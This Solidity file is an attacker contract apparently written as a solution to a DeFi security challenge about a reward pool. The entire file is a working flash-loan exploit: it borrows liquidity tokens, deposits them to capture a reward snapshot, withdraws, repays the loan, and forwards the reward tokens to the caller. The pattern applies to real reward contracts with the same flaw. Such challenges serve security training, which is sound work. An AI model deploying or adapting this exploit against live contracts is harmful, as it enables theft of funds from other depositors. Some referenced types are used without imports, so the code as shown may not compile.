// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

contract RewarderAttacker {
    TheRewarderPool public rewarderPool;
    FlashLoanerPool public flashLoanProvider;
    address public liquidityToken;

    constructor(address _rewarderPool, address _flashLoanProvider, address _liquidityToken) {
        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanProvider = FlashLoanerPool(_flashLoanProvider);
        liquidityToken = _liquidityToken;
    }

    function attack(uint256 loanAmount) external {
        // Get a flash loan
        flashLoanProvider.flashLoan(loanAmount);
        // Flash loan funds are now available to this contract for use

        // Any additional profit (rewards) can be transferred to the executor of the exploit
        uint256 rewardBalance = RewardToken(rewarderPool.rewardToken()).balanceOf(address(this));
        RewardToken(rewarderPool.rewardToken()).transfer(msg.sender, rewardBalance);
    }

    // This function is called by the FlashLoanProvider after it sends the loan amount
    function receiveFlashLoan(uint256 loanAmount) external {
        require(msg.sender == address(flashLoanProvider), "Only flashLoanProvider can call this function");

        // Deposit the flash loan into the reward pool
        SafeTransferLib.safeApprove(liquidityToken, address(rewarderPool), loanAmount);
        rewarderPool.deposit(loanAmount);

        // Call distributeRewards to claim the rewards. This will create a snapshot of the reward pool
        rewarderPool.distributeRewards();

        // Withdraw the flash loan from the reward pool
        rewarderPool.withdraw(loanAmount);

        // Repay the flash loan
        SafeTransferLib.safeTransfer(liquidityToken, address(flashLoanProvider), loanAmount);
    }
}
